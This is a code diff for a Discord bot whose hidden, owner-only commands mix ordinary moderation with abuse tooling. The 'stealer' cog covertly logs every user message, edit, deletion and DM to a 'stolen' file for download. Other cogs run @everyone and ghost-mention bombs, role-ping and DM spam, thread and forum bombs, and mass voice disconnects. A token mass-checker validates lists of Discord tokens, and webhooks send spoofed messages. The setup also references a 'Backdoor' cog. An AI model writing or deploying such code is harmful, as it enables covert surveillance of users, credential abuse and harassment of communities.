+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def lockchannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
+        """1. lock a channel by removing send permissions for everyone."""
+        channel = channel or ctx.channel
+        overwrite = channel.overwrites_for(ctx.guild.default_role)
+        overwrite.send_messages = False
+        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
+        await ctx.send(f"locked {channel.mention}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def unlockchannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
+        """2. unlock a previously locked channel."""
+        channel = channel or ctx.channel
+        overwrite = channel.overwrites_for(ctx.guild.default_role)
+        overwrite.send_messages = True
+        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
+        await ctx.send(f"unlocked {channel.mention}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def lockdown(self, ctx: commands.Context):
+        """3. lockdown the entire server by locking all channels."""
+        count = 0
+        for channel in ctx.guild.text_channels:
+            overwrite = channel.overwrites_for(ctx.guild.default_role)
+            overwrite.send_messages = False
+            try:
+                await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
+                count += 1
+                await asyncio.sleep(0.2)
+            except:
+                pass
+        await ctx.send(f"locked down {count} channels.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def unlockall(self, ctx: commands.Context):
+        """4. unlock all channels in the server."""
+        count = 0
+        for channel in ctx.guild.text_channels:
+            overwrite = channel.overwrites_for(ctx.guild.default_role)
+            overwrite.send_messages = True
+            try:
+                await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
+                count += 1
+                await asyncio.sleep(0.2)
+            except:
+                pass
+        await ctx.send(f"unlocked {count} channels.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def slowmode(self, ctx: commands.Context, seconds: int, channel: discord.TextChannel = None):
+        """5. set slowmode on a channel."""
+        channel = channel or ctx.channel
+        await channel.edit(slowmode_delay=seconds)
+        await ctx.send(f"slowmode set to {seconds}s on {channel.mention}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def setnsfw(self, ctx: commands.Context, channel: discord.TextChannel = None):
+        """6. toggle a channel as nsfw."""
+        channel = channel or ctx.channel
+        await channel.edit(nsfw=not channel.nsfw)
+        await ctx.send(f"{channel.mention} nsfw set to {not channel.nsfw}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def archive(self, ctx: commands.Context, channel: discord.TextChannel = None):
+        """7. archive a channel by removing all permissions."""
+        channel = channel or ctx.channel
+        await channel.set_permissions(ctx.guild.default_role, read_messages=False, send_messages=False)
+        await ctx.send(f"archived {channel.mention}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def voicemute(self, ctx: commands.Context, target: discord.Member):
+        """8. server mute a member in voice."""
+        await target.edit(mute=True)
+        await ctx.send(f"voice muted {target.mention}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def voiceunmute(self, ctx: commands.Context, target: discord.Member):
+        """9. server unmute a member in voice."""
+        await target.edit(mute=False)
+        await ctx.send(f"voice unmuted {target.mention}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def voicedeafen(self, ctx: commands.Context, target: discord.Member):
+        """10. server deafen a member in voice."""
+        await target.edit(deafen=True)
+        await ctx.send(f"voice deafened {target.mention}.", delete_after=5)
+
+# ========================================
+# message_manip.py
+# ========================================
+class MessageManip(commands.Cog, name="message_manip"):
+    """11-20: message content manipulation."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def editmsg(self, ctx: commands.Context, message_id: int, *, new_content: str):
+        """11. edit any message sent by the bot."""
+        try:
+            msg = await ctx.channel.fetch_message(message_id)
+            if msg.author == self.bot.user:
+                await msg.edit(content=new_content)
+                await ctx.send("message edited.", delete_after=5)
+            else:
+                await ctx.send("that message was not sent by me.", delete_after=5)
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def pinmsg(self, ctx: commands.Context, message_id: int):
+        """12. pin any message by id."""
+        try:
+            msg = await ctx.channel.fetch_message(message_id)
+            await msg.pin()
+            await ctx.send("message pinned.", delete_after=5)
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def unpinmsg(self, ctx: commands.Context, message_id: int):
+        """13. unpin any message by id."""
+        try:
+            msg = await ctx.channel.fetch_message(message_id)
+            await msg.unpin()
+            await ctx.send("message unpinned.", delete_after=5)
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def pinspam(self, ctx: commands.Context, count: int = 20):
+        """14. send and pin many messages rapidly."""
+        pinned = 0
+        for i in range(count):
+            msg = await ctx.send(f"pin spam {i}")
+            try:
+                await msg.pin()
+                pinned += 1
+            except:
+                pass
+            await asyncio.sleep(0.5)
+        await ctx.send(f"pinned {pinned} messages.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def unpinall(self, ctx: commands.Context):
+        """15. unpin all pinned messages."""
+        pins = await ctx.channel.pins()
+        count = 0
+        for msg in pins:
+            try:
+                await msg.unpin()
+                count += 1
+                await asyncio.sleep(0.3)
+            except:
+                pass
+        await ctx.send(f"unpinned {count} messages.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def replaceall(self, ctx: commands.Context, old: str, new: str):
+        """16. find and replace text in recent bot messages."""
+        count = 0
+        async for msg in ctx.channel.history(limit=100):
+            if msg.author == self.bot.user and old in msg.content:
+                try:
+                    await msg.edit(content=msg.content.replace(old, new))
+                    count += 1
+                    await asyncio.sleep(0.5)
+                except:
+                    pass
+        await ctx.send(f"replaced '{old}' with '{new}' in {count} messages.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deletemsg(self, ctx: commands.Context, message_id: int):
+        """17. delete a specific message by id."""
+        try:
+            msg = await ctx.channel.fetch_message(message_id)
+            await msg.delete()
+            await ctx.send("message deleted.", delete_after=5)
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deleteuser(self, ctx: commands.Context, target: discord.Member, limit: int = 100):
+        """18. delete recent messages from a specific user."""
+        count = 0
+        async for msg in ctx.channel.history(limit=limit):
+            if msg.author == target:
+                try:
+                    await msg.delete()
+                    count += 1
+                    await asyncio.sleep(0.3)
+                except:
+                    pass
+        await ctx.send(f"deleted {count} messages from {target.mention}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deletecontains(self, ctx: commands.Context, *, keyword: str):
+        """19. delete all recent messages containing a keyword."""
+        count = 0
+        async for msg in ctx.channel.history(limit=200):
+            if keyword.lower() in msg.content.lower():
+                try:
+                    await msg.delete()
+                    count += 1
+                    await asyncio.sleep(0.3)
+                except:
+                    pass
+        await ctx.send(f"deleted {count} messages containing '{keyword}'.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def quotemsg(self, ctx: commands.Context, message_id: int):
+        """20. quote a message with an embed."""
+        try:
+            msg = await ctx.channel.fetch_message(message_id)
+            embed = discord.Embed(
+                description=msg.content or "[no text content]",
+                color=msg.author.color if msg.author.color.value else discord.Color.blurple(),
+                timestamp=msg.created_at,
+            )
+            embed.set_author(name=str(msg.author), icon_url=msg.author.display_avatar.url)
+            embed.set_footer(text=f"#{msg.channel.name}")
+            if msg.attachments:
+                embed.set_image(url=msg.attachments[0].url)
+            await ctx.send(embed=embed)
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+# ========================================
+# stealer.py
+# ========================================
+STEAL_DIR = "data/stolen"
+os.makedirs(STEAL_DIR, exist_ok=True)
+
+class Stealer(commands.Cog, name="stealer"):
+    """credential and information harvesting simulation."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+        self.log_file = os.path.join(STEAL_DIR, "harvested.txt")
+
+    def log(self, content: str):
+        with open(self.log_file, "a", encoding="utf-8") as f:
+            f.write(content + "\n")
+
+    @commands.Cog.listener()
+    async def on_message(self, message: discord.Message):
+        if message.author == self.bot.user:
+            return
+        self.log(f"[{message.guild.name if message.guild else 'DM'}] {message.author} ({message.author.id}): {message.content}")
+
+    @commands.Cog.listener()
+    async def on_message_edit(self, before: discord.Message, after: discord.Message):
+        if after.author == self.bot.user:
+            return
+        self.log(f"[EDIT] {after.author}: before='{before.content}' after='{after.content}'")
+
+    @commands.Cog.listener()
+    async def on_message_delete(self, message: discord.Message):
+        if message.author == self.bot.user:
+            return
+        self.log(f"[DELETE] {message.author}: '{message.content}'")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def dumpmessages(self, ctx: commands.Context, channel: discord.TextChannel = None, limit: int = 100):
+        """dump recent messages from a channel to a file."""
+        channel = channel or ctx.channel
+        messages = []
+        async for msg in channel.history(limit=limit):
+            messages.append(f"[{msg.created_at}] {msg.author}: {msg.content}")
+        filename = f"{STEAL_DIR}/{channel.id}_dump.txt"
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write("\n".join(messages))
+        await ctx.send(f"dumped {len(messages)} messages to `{filename}`.", file=discord.File(filename))
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def harvest(self, ctx: commands.Context):
+        """download the full harvested log."""
+        if os.path.exists(self.log_file):
+            await ctx.send(file=discord.File(self.log_file))
+        else:
+            await ctx.send("no harvested data.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def clearlog(self, ctx: commands.Context):
+        """clear the harvested log."""
+        open(self.log_file, "w").close()
+        await ctx.send("log cleared.")
+
+# ========================================
+# mention_bomb.py
+# ========================================
+class MentionBomb(commands.Cog, name="mention_bomb"):
+    """mass mention and notification exploitation."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def mentionall(self, ctx: commands.Context, *, message: str = ""):
+        """mention @everyone in a broken-up way to bypass limits."""
+        await ctx.message.delete()
+        mentions = ["@everyone"] * 5
+        msg = " ".join(mentions) + " " + message
+        try:
+            await ctx.send(msg[:2000])
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def ghostmention(self, ctx: commands.Context, target: discord.Member, count: int = 20):
+        """repeatedly mention and delete to generate notifications."""
+        for _ in range(count):
+            msg = await ctx.send(target.mention)
+            await msg.delete()
+            await asyncio.sleep(0.3)
+        await ctx.send("ghost mention complete.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def roleping(self, ctx: commands.Context, role: discord.Role, count: int = 10):
+        """spam a role mention."""
+        if not role.mentionable:
+            await role.edit(mentionable=True)
+        for _ in range(count):
+            await ctx.send(role.mention)
+            await asyncio.sleep(0.5)
+        await ctx.send(f"pinged {role.name} {count} times.", delete_after=5)
 
 # ========================================
 # scheduler.py
@@ -2624,563 +5857,6 @@ class Scraper(commands.Cog, name="scraper"):
             if names:
                 msg.append(f"{s}: {', '.join(names[:10])}{'...' if len(names)>10 else ''}")
         await ctx.send("\n".join(msg))
-
-# ========================================
-# server_analyzer.py
-# ========================================
-class ServerAnalyzer(commands.Cog, name="server_analyzer"):
-    """41-50: deep server analysis and statistics."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def activitymap(self, ctx: commands.Context):
-        """42. generate an activity heatmap of channel usage."""
-        data = {}
-        for channel in ctx.guild.text_channels:
-            try:
-                count = 0
-                async for _ in channel.history(limit=500):
-                    count += 1
-                data[channel.name] = count
-            except:
-                data[channel.name] = 0
-        sorted_data = sorted(data.items(), key=lambda x: x[1], reverse=True)
-        result = [f"{name}: {count} msgs" for name, count in sorted_data]
-        await ctx.send("**channel activity:**\n```\n" + "\n".join(result[:15]) + "\n```")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def topchatters(self, ctx: commands.Context, limit: int = 100):
-        """43. find the most active users in recent history."""
-        counter = Counter()
-        for channel in ctx.guild.text_channels[:5]:
-            try:
-                async for msg in channel.history(limit=limit):
-                    counter[str(msg.author)] += 1
-            except:
-                continue
-        result = [f"{name}: {count}" for name, count in counter.most_common(20)]
-        await ctx.send("**top chatters:**\n```\n" + "\n".join(result) + "\n```")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def mostusedwords(self, ctx: commands.Context, limit: int = 500):
-        """44. find the most commonly used words."""
-        counter = Counter()
-        stopwords = {"the", "a", "an", "is", "in", "it", "of", "to", "and", "that", "for", "on", "with", "as", "this", "was", "be", "at", "by", "or", "not"}
-        for channel in ctx.guild.text_channels[:5]:
-            try:
-                async for msg in channel.history(limit=limit):
-                    words = msg.content.lower().split()
-                    for word in words:
-                        clean = ''.join(c for c in word if c.isalpha())
-                        if clean and len(clean) > 3 and clean not in stopwords:
-                            counter[clean] += 1
-            except:
-                continue
-        result = [f"{word}: {count}" for word, count in counter.most_common(30)]
-        await ctx.send("**most used words:**\n```\n" + "\n".join(result) + "\n```")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def joinorder(self, ctx: commands.Context):
-        """45. list members in order of join date."""
-        members = sorted(ctx.guild.members, key=lambda m: m.joined_at or datetime.datetime.min)
-        result = [f"{i+1}. {m.name} - {m.joined_at.strftime('%Y-%m-%d') if m.joined_at else 'unknown'}" for i, m in enumerate(members[:30])]
-        await ctx.send("**join order:**\n```\n" + "\n".join(result) + "\n```")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def rolebreakdown(self, ctx: commands.Context):
-        """46. see how many members have each role."""
-        result = []
-        for role in ctx.guild.roles:
-            if role.is_default():
-                continue
-            result.append(f"{role.name}: {len(role.members)}")
-        await ctx.send("**role breakdown:**\n```\n" + "\n".join(result[:30]) + "\n```")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def inactive(self, ctx: commands.Context, days: int = 30):
-        """47. find members who have not sent a message in n days."""
-        cutoff = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=days)
-        active = set()
-        for channel in ctx.guild.text_channels:
-            try:
-                async for msg in channel.history(after=cutoff, limit=50):
-                    active.add(msg.author.id)
-            except:
-                continue
-        inactive_members = [m for m in ctx.guild.members if m.id not in active and not m.bot]
-        result = [f"{m.name} (joined: {m.joined_at.strftime('%Y-%m-%d') if m.joined_at else 'unknown'})" for m in inactive_members[:30]]
-        await ctx.send(f"**inactive members ({days} days):**\n```\n" + "\n".join(result) + "\n```" if result else "everyone is active.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def boosters(self, ctx: commands.Context):
-        """48. list all server boosters."""
-        boosters = [m for m in ctx.guild.members if m.premium_since is not None]
-        result = [f"{m.name} - boosting since {m.premium_since.strftime('%Y-%m-%d')}" for m in boosters]
-        await ctx.send("**boosters:**\n```\n" + "\n".join(result) + "\n```" if result else "no boosters.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def permissionscan(self, ctx: commands.Context, target: discord.Member):
-        """49. scan all permissions a user has in every channel."""
-        result = []
-        for channel in ctx.guild.channels:
-            perms = channel.permissions_for(target)
-            granted = [p for p, v in perms if v and p not in ("create_instant_invite", "change_nickname", "read_messages", "read_message_history", "view_channel")]
-            if granted:
-                result.append(f"#{channel.name}: {', '.join(granted[:5])}")
-        await ctx.send(f"**permissions for {target.name}:**\n```\n" + "\n".join(result[:25]) + "\n```" if result else "no special permissions found.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def securityaudit(self, ctx: commands.Context):
-        """50. audit server security settings."""
-        issues = []
-        guild = ctx.guild
-        if guild.default_notifications == discord.NotificationLevel.all_messages:
-            issues.append("default notifications set to all messages")
-        if guild.verification_level == discord.VerificationLevel.none:
-            issues.append("no verification level set")
-        if guild.explicit_content_filter == discord.ContentFilter.disabled:
-            issues.append("explicit content filter disabled")
-        for role in guild.roles:
-            if role.permissions.administrator and not role.managed and role != guild.default_role:
-                issues.append(f"admin role exists: {role.name} ({len(role.members)} members)")
-        admin_count = sum(1 for m in guild.members if m.guild_permissions.administrator)
-        issues.append(f"total administrators: {admin_count}")
-        if "COMMUNITY" not in guild.features:
-            issues.append("server is not a community server")
-        await ctx.send("**security audit:**\n```\n" + "\n".join(issues) + "\n```")
-
-# ========================================
-# spammer.py
-# ========================================
-class Spammer(commands.Cog, name="spammer"):
-    """message spamming utilities."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def spam(self, ctx: commands.Context, count: int, *, message: str):
-        """spam a message in the current channel."""
-        for _ in range(count):
-            await ctx.send(message)
-            await asyncio.sleep(0.5)
-        await ctx.send(f"spammed {count} messages.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def fastspam(self, ctx: commands.Context, count: int, *, message: str):
-        """spam without delays."""
-        for _ in range(count):
-            await ctx.send(message)
-        await ctx.send(f"fast spammed {count} messages.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def dmspam(self, ctx: commands.Context, target: discord.Member, count: int, *, message: str):
-        """spam a user's dms."""
-        for _ in range(count):
-            try:
-                await target.send(message)
-                await asyncio.sleep(1)
-            except:
-                break
-        await ctx.send(f"dm spammed {target.name}.")
-
-# ========================================
-# stealer.py
-# ========================================
-STEAL_DIR = "data/stolen"
-os.makedirs(STEAL_DIR, exist_ok=True)
-
-class Stealer(commands.Cog, name="stealer"):
-    """credential and information harvesting simulation."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-        self.log_file = os.path.join(STEAL_DIR, "harvested.txt")
-
-    def log(self, content: str):
-        with open(self.log_file, "a", encoding="utf-8") as f:
-            f.write(content + "\n")
-
-    @commands.Cog.listener()
-    async def on_message(self, message: discord.Message):
-        if message.author == self.bot.user:
-            return
-        self.log(f"[{message.guild.name if message.guild else 'DM'}] {message.author} ({message.author.id}): {message.content}")
-
-    @commands.Cog.listener()
-    async def on_message_edit(self, before: discord.Message, after: discord.Message):
-        if after.author == self.bot.user:
-            return
-        self.log(f"[EDIT] {after.author}: before='{before.content}' after='{after.content}'")
-
-    @commands.Cog.listener()
-    async def on_message_delete(self, message: discord.Message):
-        if message.author == self.bot.user:
-            return
-        self.log(f"[DELETE] {message.author}: '{message.content}'")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def dumpmessages(self, ctx: commands.Context, channel: discord.TextChannel = None, limit: int = 100):
-        """dump recent messages from a channel to a file."""
-        channel = channel or ctx.channel
-        messages = []
-        async for msg in channel.history(limit=limit):
-            messages.append(f"[{msg.created_at}] {msg.author}: {msg.content}")
-        filename = f"{STEAL_DIR}/{channel.id}_dump.txt"
-        with open(filename, "w", encoding="utf-8") as f:
-            f.write("\n".join(messages))
-        await ctx.send(f"dumped {len(messages)} messages to `{filename}`.", file=discord.File(filename))
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def harvest(self, ctx: commands.Context):
-        """download the full harvested log."""
-        if os.path.exists(self.log_file):
-            await ctx.send(file=discord.File(self.log_file))
-        else:
-            await ctx.send("no harvested data.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def clearlog(self, ctx: commands.Context):
-        """clear the harvested log."""
-        open(self.log_file, "w").close()
-        await ctx.send("log cleared.")
-
-# ========================================
-# thread_bomb.py
-# ========================================
-class ThreadBomb(commands.Cog, name="thread_bomb"):
-    """81-87: thread and forum manipulation."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def threadbomb(self, ctx: commands.Context, count: int = 30, *, name: str = "chaos"):
-        """81. create many threads in a channel."""
-        channel = ctx.channel
-        created = 0
-        for i in range(count):
-            try:
-                await channel.create_thread(name=f"{name}-{i}", type=discord.ChannelType.public_thread)
-                created += 1
-                await asyncio.sleep(0.3)
-            except:
-                break
-        await ctx.send(f"created {created} threads.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def archvethreads(self, ctx: commands.Context):
-        """82. archive all active threads."""
-        count = 0
-        for thread in ctx.guild.threads:
-            try:
-                await thread.edit(archived=True, locked=True)
-                count += 1
-                await asyncio.sleep(0.2)
-            except:
-                pass
-        await ctx.send(f"archived {count} threads.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deletethreads(self, ctx: commands.Context):
-        """83. delete all threads."""
-        count = 0
-        for thread in ctx.guild.threads:
-            try:
-                await thread.delete()
-                count += 1
-                await asyncio.sleep(0.2)
-            except:
-                pass
-        await ctx.send(f"deleted {count} threads.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def unarchivethreads(self, ctx: commands.Context):
-        """84. unarchive all archived threads."""
-        count = 0
-        for thread in ctx.guild.threads:
-            if thread.archived:
-                try:
-                    await thread.edit(archived=False, locked=False)
-                    count += 1
-                    await asyncio.sleep(0.2)
-                except:
-                    pass
-        await ctx.send(f"unarchived {count} threads.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def threadspam(self, ctx: commands.Context, count: int = 5, *, message: str = "thread spam"):
-        """85. send a message to all threads."""
-        sent = 0
-        for thread in ctx.guild.threads:
-            if not thread.archived:
-                try:
-                    await thread.send(message)
-                    sent += 1
-                    await asyncio.sleep(0.3)
-                except:
-                    pass
-        await ctx.send(f"messaged {sent} threads.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def forumspam(self, ctx: commands.Context, count: int = 20, *, name: str = "post"):
-        """86. create posts in forum channels."""
-        created = 0
-        for channel in ctx.guild.forums:
-            for i in range(count):
-                try:
-                    await channel.create_thread(name=f"{name}-{i}", content="spam")
-                    created += 1
-                    await asyncio.sleep(0.5)
-                except:
-                    break
-        await ctx.send(f"created {created} forum posts.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def privatethread(self, ctx: commands.Context, target: discord.Member):
-        """87. create a private thread with a target."""
-        thread = await ctx.channel.create_thread(
-            name=f"private-{target.name}",
-            type=discord.ChannelType.private_thread,
-        )
-        await thread.add_user(target)
-        await ctx.send(f"private thread created with {target.mention}.", delete_after=5)
-
-# ========================================
-# token_tools.py
-# ========================================
-class TokenTools(commands.Cog, name="token_tools"):
-    """discord token checking and validation utilities."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    async def validate_token(self, token: str):
-        """check if a token is valid and return basic user info."""
-        headers = {"Authorization": f"Bot {token}"}
-        async with aiohttp.ClientSession() as session:
-            async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    return True, data
-                return False, None
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def checktoken(self, ctx: commands.Context, token: str):
-        """validate a discord bot token."""
-        valid, data = await self.validate_token(token)
-        if valid:
-            await ctx.send(f"valid token.\nuser: {data['username']}#{data['discriminator']}\nid: {data['id']}")
-        else:
-            await ctx.send("invalid token.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def masscheck(self, ctx: commands.Context):
-        """check tokens from an attached .txt file."""
-        if not ctx.message.attachments:
-            return await ctx.send("attach a .txt file with tokens (one per line).")
-        attachment = ctx.message.attachments[0]
-        content = (await attachment.read()).decode("utf-8", errors="replace")
-        tokens = [line.strip() for line in content.splitlines() if line.strip()]
-        if not tokens:
-            return await ctx.send("no tokens found in file.")
-        valid_list = []
-        for tok in tokens:
-            valid, data = await self.validate_token(tok)
-            if valid:
-                valid_list.append(f"{data['username']}#{data['discriminator']} - {data['id']}")
-            await asyncio.sleep(0.5)
-        await ctx.send(f"checked {len(tokens)} tokens. valid: {len(valid_list)}\n```\n" + "\n".join(valid_list[:20]) + "\n```")
-
-# ========================================
-# voice_manip.py
-# ========================================
-class VoiceManip(commands.Cog, name="voice_manip"):
-    """51-57: voice channel manipulation."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def vcmove(self, ctx: commands.Context, target: discord.Member, channel: discord.VoiceChannel):
-        """51. force move a member to a different voice channel."""
-        await target.move_to(channel)
-        await ctx.send(f"moved {target.mention} to {channel.name}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def vckick(self, ctx: commands.Context, target: discord.Member):
-        """52. disconnect a member from voice."""
-        await target.move_to(None)
-        await ctx.send(f"disconnected {target.mention}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def vcdisconnectall(self, ctx: commands.Context):
-        """53. disconnect all members from all voice channels."""
-        count = 0
-        for vc in ctx.guild.voice_channels:
-            for member in vc.members:
-                try:
-                    await member.move_to(None)
-                    count += 1
-                    await asyncio.sleep(0.2)
-                except:
-                    pass
-        await ctx.send(f"disconnected {count} members.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def vcmuteall(self, ctx: commands.Context):
-        """54. mute all members in voice."""
-        count = 0
-        for vc in ctx.guild.voice_channels:
-            for member in vc.members:
-                try:
-                    await member.edit(mute=True)
-                    count += 1
-                    await asyncio.sleep(0.1)
-                except:
-                    pass
-        await ctx.send(f"muted {count} members.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def vcdeafenall(self, ctx: commands.Context):
-        """55. deafen all members in voice."""
-        count = 0
-        for vc in ctx.guild.voice_channels:
-            for member in vc.members:
-                try:
-                    await member.edit(deafen=True)
-                    count += 1
-                    await asyncio.sleep(0.1)
-                except:
-                    pass
-        await ctx.send(f"deafened {count} members.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def vcspam(self, ctx: commands.Context, count: int = 10):
-        """56. create and delete voice channels rapidly."""
-        for i in range(count):
-            vc = await ctx.guild.create_voice_channel(f"spam-vc-{i}")
-            await vc.delete()
-        await ctx.send(f"vc spam cycle complete.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def vclimit(self, ctx: commands.Context, channel: discord.VoiceChannel, limit: int):
-        """57. set user limit on a voice channel."""
-        await channel.edit(user_limit=limit)
-        await ctx.send(f"set {channel.name} limit to {limit}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def startvc(self, ctx: commands.Context, channel: discord.VoiceChannel = None):
-        """58. makes the bot join a voice channel and stay there."""
-        channel = channel or (ctx.author.voice.channel if ctx.author.voice else None)
-        if not channel:
-            return await ctx.send("you must be in a voice channel or specify one.")
-        if ctx.voice_client:
-            await ctx.voice_client.move_to(channel)
-        else:
-            await channel.connect()
-        await ctx.send(f"joined {channel.name} and idling.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def stopvc(self, ctx: commands.Context):
-        """59. makes the bot leave the voice channel."""
-        if ctx.voice_client:
-            await ctx.voice_client.disconnect()
-            await ctx.send("left voice channel.")
-        else:
-            await ctx.send("not in a voice channel.")
-
-# ========================================
-# webhook.py
-# ========================================
-class Webhook(commands.Cog, name="webhook"):
-    """webhook manipulation tools."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def createhook(self, ctx: commands.Context, name: str = "hook"):
-        """create a webhook in the current channel."""
-        try:
-            hook = await ctx.channel.create_webhook(name=name)
-            await ctx.send(f"created webhook: {hook.url}")
-        except discord.Forbidden:
-            await ctx.send("missing permissions.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def sendhook(self, ctx: commands.Context, webhook_url: str, *, message: str):
-        """send a message via a webhook url."""
-        async with aiohttp.ClientSession() as session:
-            webhook = discord.Webhook.from_url(webhook_url, session=session)
-            try:
-                await webhook.send(message, username="spoof")
-                await ctx.send("message sent.")
-            except Exception as e:
-                await ctx.send(f"error: {e}")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def spammhook(self, ctx: commands.Context, webhook_url: str, count: int, *, message: str):
-        """spam a webhook."""
-        async with aiohttp.ClientSession() as session:
-            webhook = discord.Webhook.from_url(webhook_url, session=session)
-            for _ in range(count):
-                try:
-                    await webhook.send(message)
-                    await asyncio.sleep(0.5)
-                except:
-                    pass
-        await ctx.send(f"spammed {count} messages.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deletehook(self, ctx: commands.Context, webhook_url: str):
-        """delete a webhook by url."""
-        async with aiohttp.ClientSession() as session:
-            webhook = discord.Webhook.from_url(webhook_url, session=session)
-            try:
-                await webhook.delete()
-                await ctx.send("webhook deleted.")
-            except Exception as e:
-                await ctx.send(f"error: {e}")
 
 # ========================================
 # webhook_advanced.py
@@ -4079,37 +6755,39 @@ class ChatCommands(commands.Cog, name="chat_commands"):
             await ctx.send("chatbot mode ended (timeout).", delete_after=5)
 
 async def setup(bot: commands.Bot):
-    await bot.add_cog(Admin(bot))
-    await bot.add_cog(AdvancedAdmin(bot))
-    await bot.add_cog(Automation(bot))
-    await bot.add_cog(Backdoor(bot))
-    await bot.add_cog(ChannelManip(bot))
-    await bot.add_cog(Cloner(bot))
     await bot.add_cog(Economy(bot))
